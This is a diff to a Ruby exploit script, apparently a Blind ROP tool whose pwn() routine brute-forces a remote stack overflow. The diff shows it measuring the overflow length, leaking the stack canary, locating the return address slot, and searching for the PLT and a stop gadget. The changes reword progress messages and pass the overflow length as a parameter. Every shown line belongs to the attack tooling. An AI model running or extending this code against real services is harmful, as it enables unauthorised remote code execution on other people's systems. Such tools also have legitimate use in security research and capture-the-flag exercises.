@@ -369,6 +369,8 @@ def check_vuln()
 end
 
 def canary_detect(len)
+	intro("Finding canary")
+
 	canary = []
 
 	$sport = true
@@ -431,8 +433,7 @@ def set_canary(data)
 	end
 end
 
-def check_overflow_len()
-	len = 4096
+def check_overflow_len(len)
 	s = nil
 	expected = 4192
 
@@ -462,7 +463,7 @@ def check_overflow_len()
 		canary_detect(len - 8)
 
 		print("Trying again with canary...\n")
-		check_overflow_len()
+		check_overflow_len(len - 8)
 
 		print("Couldn't find overflow_len") if not $state.overflow_len
 		print("Couldn't find canary\n") if not $state.canary
@@ -509,6 +510,8 @@ def check_stack_depth()
 end
 
 def check_pad()
+	intro("Finding return address location")
+
 	pad = 0
 	max = 100
 
@@ -2302,13 +2305,13 @@ def pwn()
 
 	check_vuln() if not $state.overflow_len
 
-	intro("Finding overflow length and canary")
-	check_overflow_len() if not $state.overflow_len
+	intro("Finding overflow length")
+	check_overflow_len(4096 - 8*100) if not $state.overflow_len
 	print_progress() if $verbose
 
 	$sport = true
 
-	intro("Finding PLT, stop gadget, and return address slot")
+	intro("Finding PLT and stop gadget")
 	find_plt_depth() if not $state.plt
 	print_progress() if $verbose
 
